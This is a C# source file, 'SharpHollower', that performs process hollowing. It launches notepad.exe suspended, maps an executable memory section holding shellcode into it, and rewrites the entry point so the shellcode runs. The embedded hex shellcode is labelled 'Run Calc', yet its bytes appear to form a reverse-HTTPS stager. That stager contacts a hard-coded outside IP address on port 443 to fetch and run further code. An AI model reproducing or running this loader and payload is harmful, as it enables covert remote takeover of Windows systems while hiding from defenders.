using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;


namespace SharpHollower
{
    public sealed class Loader
    {
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);
        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);
        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();
        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void CloseHandle(IntPtr handle);
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);
        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);
        [DllImport("kernel32.dll")]
        static extern uint GetLastError();
        public static byte[] target_ = Encoding.ASCII.GetBytes("calc.exe");
        public static string HollowedProcessX85 = "C:\\Windows\\SysWOW64\\notepad.exe";

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            uint dwFlags;
            ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        public const uint PageReadWriteExecute = 0x40;
        public const uint PageReadWrite = 0x04;
        public const uint PageExecuteRead = 0x20;
        public const uint MemCommit = 0x00001000;
        public const uint SecCommit = 0x08000000;
        public const uint GenericAll = 0x10000000;
        public const uint CreateSuspended = 0x00000004;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;



        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }

        IntPtr section_;
        IntPtr localmap_;
        IntPtr remotemap_;
        IntPtr localsize_;
        IntPtr remotesize_;
        IntPtr pModBase_;
        IntPtr pEntry_;
        uint rvaEntryOffset_;
        uint size_;
        byte[] inner_;

        public uint round_to_page(uint size)
        {
            SYSTEM_INFO info = new SYSTEM_INFO();

            GetSystemInfo(ref info);

            return (info.dwPageSize - size % info.dwPageSize) + size;
        }

        const int AttributeSize = 24;

        private bool nt_success(long v)
        {
            return (v >= 0);
        }

        public IntPtr GetCurrent()
        {
            return GetCurrentProcess();
        }



        /***
         *  Maps a view of the current section into the process specified in procHandle.
         */
        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;


            long status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);

            if (!nt_success(status))
                throw new SystemException("[x] Something went wrong! " + status);

            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        /***
         *  Attempts to create an RWX section of the given size 
         */
        public bool CreateSection(uint size)
        {
            LARGE_INTEGER liVal = new LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;

            long status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);

            return nt_success(status);
        }



        /***
         *  Maps a view of the section into the current process
         */
        public void SetLocalSection(uint size)
        {

            KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
            if (vals.Key == (IntPtr)0)
                throw new SystemException("[x] Failed to map view of section!");

            localmap_ = vals.Key;
            localsize_ = vals.Value;

        }

        /***
         * Copies the shellcode buffer into the section 
         */
        public void CopyShellcode(byte[] buf)
        {
            long lsize = size_;
            if (buf.Length > lsize)
                throw new IndexOutOfRangeException("[x] Shellcode buffer is too long!");

            unsafe
            {
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {
                    p[i] = buf[i];
                }
            }
        }

        /***
         *  Create a new process using the binary located at "path", starting up suspended.
         */
        public PROCESS_INFORMATION StartProcess(string path)
        {
            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();

            uint flags = CreateSuspended;// | DetachedProcess | CreateNoWindow;

            if (!CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo))
                throw new SystemException("[x] Failed to create process!");


            return procInfo;
        }

        const ulong PatchSize = 0x10;

        /***
         *  Constructs the shellcode patch for the new process entry point. It will build either an x86 or x64 payload based
         *  on the current pointer size.
         *  Ultimately, we will jump to the shellcode payload
         */
        public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

            unsafe
            {
                byte* p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8; // mov eax, <imm4>
                    i++;
                    Int32 val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48; // rex
                    i++;
                    p[i] = 0xb8; // mov rax, <imm8>
                    i++;

                    Int64 val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0; // jmp [r|e]ax
                i++;
            }

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }


        /**
         * We will locate the entry point for the main module in the remote process for patching.
         */
        private IntPtr GetEntryFromBuffer(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c)); // e_lfanew offset in IMAGE_DOS_HEADERS

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18); // IMAGE_OPTIONAL_HEADER start

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10); // entry point rva

                    int tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    // rva -> va
                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        /**
         *  Locate the module base addresss in the remote process,
         *  read in the first page, and locate the entry point.
         */
        public IntPtr FindEntry(IntPtr hProc)
        {
            PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            long success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            if (!nt_success(success))
                throw new SystemException("[x] Failed to get process information!");

            IntPtr readLoc = IntPtr.Zero;
            byte[] addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;

            if (!ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException("[x] Failed to read process memory!");

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;
            if (!ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException("[x] Failed to read module start!");

            return GetEntryFromBuffer(inner_);
        }

        /**
         *  Map our shellcode into the remote (suspended) process,
         *  locate and patch the entry point (so our code will run instead of
         *  the original application), and resume execution.
         */
        public void MapAndStart(PROCESS_INFORMATION pInfo)
        {

            KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
            if (tmp.Key == (IntPtr)0 || tmp.Value == (IntPtr)0)
                throw new SystemException("[x] Failed to map section into target process!");

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            KeyValuePair<int, IntPtr> patch = BuildEntryPatch(tmp.Key);

            try
            {

                IntPtr pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();

                if (!WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr) || tPtr == IntPtr.Zero)
                    throw new SystemException("[x] Failed to write patch to start location! " + GetLastError());
            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }

            byte[] tbuf = new byte[0x1000];
            IntPtr nRead = new IntPtr();
            if (!ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead))
                throw new SystemException("Failed!");

            uint res = ResumeThread(pInfo.hThread);
            if (res == unchecked((uint)-1))
                throw new SystemException("[x] Failed to restart thread!");

        }

        public IntPtr GetBuffer()
        {
            return localmap_;
        }
        ~Loader()
        {
            if (localmap_ != (IntPtr)0)
                ZwUnmapViewOfSection(section_, localmap_);

        }

        /**
         * Given a path to a binary and a buffer of shellcode,
         * 1.) start a new (supended) process
         * 2.) map a view of our shellcode buffer into it
         * 3.) patch the original process entry point
         * 4.) resume execution
         */
        public void Load(string targetProcess, byte[] shellcode)
        {

            PROCESS_INFORMATION pinf = StartProcess(targetProcess);
            FindEntry(pinf.hProcess);

            if (!CreateSection((uint)shellcode.Length))
                throw new SystemException("[x] Failed to create new section!");

            SetLocalSection((uint)shellcode.Length);

            CopyShellcode(shellcode);


            MapAndStart(pinf);

            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);

        }

        public Loader()
        {
            section_ = new IntPtr();
            localmap_ = new IntPtr();
            remotemap_ = new IntPtr();
            localsize_ = new IntPtr();
            remotesize_ = new IntPtr();
            inner_ = new byte[0x1000]; // Reserve a page of scratch space
        }

        private static string EncryptDecrypt(string szPlainText, int szEncryptionKey)
        {
            StringBuilder szInputStringBuild = new StringBuilder(szPlainText);
            StringBuilder szOutStringBuild = new StringBuilder(szPlainText.Length);
            char Textch;
            for (int iCount = 0; iCount < szPlainText.Length; iCount++)
            {
                Textch = szInputStringBuild[iCount];
                Textch = (char)(Textch ^ szEncryptionKey);
                szOutStringBuild.Append(Textch);
            }
            return szOutStringBuild.ToString();
        }



        private static string GetCommandLine()
        {
            string s = "";
            return s;
        }

        public static byte[] ToByteArray(String hexString)
        {
            byte[] retval = new byte[hexString.Length / 2];
            for (int i = 0; i < hexString.Length; i += 2)
                retval[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
            return retval;
        }

        static void Main(string[] args)
        {
            /* Run Calc */
            //byte[] shellcode = new byte[] {
            //0xfc};
            
            string shellcodetext =  "0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, " +
                                    "0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, " +
                                    "0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, " +
                                    "0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, " +
                                    "0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, " +
                                    "0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, " +
                                    "0x8b, 0x58, 0x20, 0x01, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x01, " +
                                    "0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, " +
                                    "0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, " +
                                    "0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, " +
                                    "0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, " +
                                    "0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, " +
                                    "0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x00, 0x68, 0x77, 0x69, 0x6e, " +
                                    "0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0xe8, 0x00, 0x00, " +
                                    "0x00, 0x00, 0x31, 0xff, 0x57, 0x57, 0x57, 0x57, 0x57, 0x68, 0x3a, 0x56, " +
                                    "0x79, 0xa7, 0xff, 0xd5, 0xe9, 0xa4, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xc9, " +
                                    "0x51, 0x51, 0x6a, 0x03, 0x51, 0x51, 0x68, 0xbb, 0x01, 0x00, 0x00, 0x53, " +
                                    "0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0x50, 0xe9, 0x8c, 0x00, " +
                                    "0x00, 0x00, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, " +
                                    "0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, " +
                                    "0x89, 0xc6, 0x83, 0xc3, 0x50, 0x68, 0x80, 0x33, 0x00, 0x00, 0x89, 0xe0, " +
                                    "0x6a, 0x04, 0x50, 0x6a, 0x1f, 0x56, 0x68, 0x75, 0x46, 0x9e, 0x86, 0xff, " +
                                    "0xd5, 0x5f, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, " +
                                    "0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xca, 0x01, 0x00, " +
                                    "0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, " +
                                    "0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, " +
                                    "0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, " +
                                    "0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, " +
                                    "0xc7, 0x75, 0x07, 0x58, 0x50, 0xe9, 0x7b, 0xff, 0xff, 0xff, 0x31, 0xff, " +
                                    "0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x6f, " +
                                    "0xff, 0xff, 0xff, 0x2f, 0x59, 0x4f, 0x4f, 0x65, 0x00, 0x60, 0x9e, 0x4d, " +
                                    "0x5b, 0x33, 0x3e, 0xee, 0x70, 0x2e, 0x2a, 0xfb, 0xae, 0x95, 0xcd, 0xb4, " +
                                    "0x13, 0x66, 0xcd, 0x58, 0x3b, 0x37, 0x77, 0xfa, 0x38, 0x44, 0x18, 0xbe, " +
                                    "0x8c, 0x83, 0x2e, 0xce, 0xef, 0xbc, 0xec, 0xd5, 0x49, 0x27, 0x12, 0x25, " +
                                    "0x62, 0x8d, 0xa1, 0x42, 0x10, 0x63, 0x77, 0x3d, 0x25, 0x18, 0x47, 0x64, " +
                                    "0x23, 0xf0, 0xe1, 0xbd, 0xbe, 0xfd, 0x7c, 0x30, 0x20, 0x3e, 0x7b, 0xf4, " +
                                    "0x81, 0x47, 0xb3, 0xa6, 0xb4, 0x16, 0x51, 0xbd, 0xa8, 0x98, 0x00, 0x55, " +
                                    "0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, " +
                                    "0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x28, " +
                                    "0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, " +
                                    "0x4d, 0x53, 0x49, 0x45, 0x20, 0x38, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, " +
                                    "0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x35, 0x2e, 0x32, " +
                                    "0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x34, 0x2e, " +
                                    "0x30, 0x3b, 0x20, 0x2e, 0x4e, 0x45, 0x54, 0x20, 0x43, 0x4c, 0x52, 0x20, " +
                                    "0x32, 0x2e, 0x30, 0x2e, 0x35, 0x30, 0x37, 0x32, 0x37, 0x29, 0x0d, 0x0a, " +
                                    "0x00, 0xa0, 0x69, 0xeb, 0x9c, 0x24, 0xe9, 0x7b, 0x4c, 0x9a, 0x05, 0x39, " +
                                    "0x0a, 0x05, 0xe9, 0xe0, 0x45, 0xde, 0x4d, 0x3c, 0xe2, 0x2c, 0xf9, 0x1f, " +
                                    "0x83, 0x81, 0xd8, 0xde, 0xc5, 0x19, 0xf0, 0xd0, 0x72, 0x11, 0x99, 0xae, " +
                                    "0x65, 0xe4, 0xd2, 0x57, 0xcb, 0xbb, 0x12, 0x5d, 0xb0, 0x45, 0x9a, 0x5f, " +
                                    "0x4f, 0x34, 0x21, 0x35, 0xd0, 0xe8, 0x83, 0x4b, 0x95, 0x66, 0xa2, 0x2b, " +
                                    "0x08, 0x4b, 0xfe, 0xcd, 0x94, 0x75, 0x3d, 0x89, 0x38, 0x8b, 0x7c, 0xd2, " +
                                    "0xe2, 0xab, 0x58, 0xba, 0x68, 0x42, 0xb6, 0x3a, 0x0a, 0x57, 0x23, 0x25, " +
                                    "0x71, 0x57, 0xe6, 0x80, 0xc6, 0x20, 0x7c, 0xdb, 0x25, 0xf0, 0x3c, 0x77, " +
                                    "0x4c, 0xab, 0x2c, 0x59, 0xed, 0xaa, 0xc5, 0x02, 0x46, 0xcc, 0x27, 0x8d, " +
                                    "0x4a, 0xcf, 0x59, 0xc6, 0x7d, 0xb5, 0x7c, 0x8d, 0xa7, 0x1d, 0x8a, 0xfd, " +
                                    "0x57, 0x02, 0x8c, 0x84, 0x71, 0x3c, 0xec, 0x04, 0x79, 0xe5, 0x64, 0xa6, " +
                                    "0x7c, 0xab, 0xca, 0xb0, 0x36, 0x47, 0xdd, 0xce, 0xcc, 0x8a, 0x2e, 0xc9, " +
                                    "0x93, 0x4c, 0x25, 0x67, 0x51, 0x05, 0x81, 0xa3, 0x18, 0x41, 0xda, 0x9e, " +
                                    "0xeb, 0x47, 0x81, 0xc3, 0x3e, 0x7b, 0xc2, 0x1b, 0x87, 0xb6, 0x4f, 0x0e, " +
                                    "0xc2, 0x1b, 0x59, 0xf3, 0x36, 0x8f, 0x50, 0x82, 0xdb, 0xa2, 0xb3, 0x82, " +
                                    "0xfa, 0xdf, 0xd2, 0x75, 0x33, 0x99, 0xa2, 0xd7, 0xef, 0x9f, 0x95, 0xbc, " +
                                    "0xd8, 0x67, 0x75, 0x23, 0x41, 0xdc, 0xe4, 0x5d, 0x36, 0x9f, 0xb0, 0x2b, " +
                                    "0x11, 0xb2, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, " +
                                    "0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, " +
                                    "0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, " +
                                    "0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, " +
                                    "0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, " +
                                    "0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, " +
                                    "0x89, 0xfd, 0xff, 0xff, 0x31, 0x30, 0x34, 0x2e, 0x31, 0x36, 0x37, 0x2e, " +
                                    "0x31, 0x31, 0x32, 0x2e, 0x31, 0x37, 0x38, 0x00, 0x22, 0xbb, 0x71, 0xbe";

            byte[] sh =
              shellcodetext
              .Split(new string[] { ", " }, StringSplitOptions.None)
              .Select(s => Byte.Parse(s.Substring(2), NumberStyles.HexNumber))
              .ToArray();

            byte[] finalshellcode = new byte[sh.Length + target_.Length + 1];
            Array.Copy(sh, finalshellcode, sh.Length);
            Array.Copy(target_, 0, finalshellcode, sh.Length, target_.Length);
            finalshellcode[sh.Length + target_.Length] = 0;

            Loader ldr = new Loader();
            try
            {
                ldr.Load(HollowedProcessX85, finalshellcode);
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Something went wrong!" + e.Message);
            }
            
        }

    }
}